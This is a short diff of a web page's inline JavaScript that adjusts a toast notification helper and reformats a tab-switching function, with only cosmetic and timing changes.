 function showToast(msg, type="success") {
   const t = document.getElementById("toast");
-  document.getElementById("toastMsg").textContent = (type==="success"?"✅ ":"❌ ") + msg;
+  document.getElementById("toastMsg").textContent = msg;
   t.className = `show ${type}`;
-  setTimeout(() => t.className = "", 3000);
+  setTimeout(() => t.className = "", 3500);
 }
-
 window.showToast = showToast;
 
-// If doLogin() ran before this module finished loading, trigger loadAll now
+// If doLogin() fired before this module loaded, trigger now
 if (window._loginPending) {
   window._loginPending = false;
   window.loadAll();
 }
-
 </script>
 
+<!-- Tab switching -->
 <script>
-// Tab switching
 function showTab(name, el) {
   document.querySelectorAll(".tab-pane").forEach(t => t.classList.remove("active"));
   document.querySelectorAll("nav a").forEach(a => a.classList.remove("active"));
   document.getElementById("tab-"+name).classList.add("active");
-  if(el) el.classList.add("active");
+  if (el) el.classList.add("active");
   document.getElementById("pageTitle").textContent =
     el ? el.textContent.trim().replace(/\d+/g,"").trim() : name;
-  if(window.innerWidth<=768) document.getElementById("sidebar").classList.remove("open");
+  if (window.innerWidth <= 768) document.getElementById("sidebar").classList.remove("open");
 }
 </script>
 
